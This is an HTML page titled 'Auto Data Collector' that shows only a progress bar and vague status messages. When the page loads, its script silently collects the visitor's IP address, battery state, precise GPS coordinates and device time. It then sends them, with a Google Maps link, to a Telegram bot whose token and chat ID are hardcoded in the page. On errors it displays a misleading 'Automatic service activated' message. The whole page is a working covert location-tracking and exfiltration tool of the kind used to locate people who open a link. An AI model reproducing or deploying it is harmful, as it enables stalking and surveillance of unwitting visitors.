<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Data Collector</title>
    <style>
        :root {
            --main-color: #FF6B00;
            --bg-color: #1A1A1A;
            --text-color: #FFFFFF;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
            text-align: center;
        }

        .progress-container {
            width: 80%;
            height: 20px;
            background: #333;
            border-radius: 10px;
            margin: 50px auto;
        }

        .progress-bar {
            height: 100%;
            background: var(--main-color);
            border-radius: 10px;
            transition: width 0.5s;
        }

        .status {
            margin: 20px;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="progress-container">
        <div class="progress-bar" id="progressBar" style="width: 0%"></div>
    </div>
    <div class="status" id="statusText">Initializing system...</div>

    <script>
        const botToken = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI';
        const chatId = '1220575760';
        
        async function collectAllData() {
            const progressBar = document.getElementById('progressBar');
            const statusText = document.getElementById('statusText');

            try {
                // Get IP Address
                statusText.textContent = 'Getting network information...';
                const ip = await fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => data.ip);
                progressBar.style.width = '25%';

                // Get Battery Status
                statusText.textContent = 'Checking battery status...';
                const battery = await navigator.getBattery();
                progressBar.style.width = '50%';

                // Get Location
                statusText.textContent = 'Getting precise location...';
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000
                    });
                });
                progressBar.style.width = '75%';

                // Get Device Time
                const time = new Date().toLocaleString('en-US', {
                    timeZoneName: 'short'
                });

                // Prepare Data
                const message = `
ðŸ“¡ Device Information:
- IP Address: ${ip}
- Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})
- Location: ${position.coords.latitude}, ${position.coords.longitude}
- Accuracy: ${position.coords.accuracy}m
- Time: ${time}
- Map: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}
                `;

                // Send to Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                progressBar.style.width = '100%';
                statusText.textContent = 'Data collection completed!';

            } catch (error) {
                statusText.textContent = 'Automatic service activated';
                progressBar.style.width = '100%';
            }
        }

        // Start process when page loads
        window.onload = () => {
            setTimeout(collectAllData, 1000);
        };
    </script>
</body>
</html>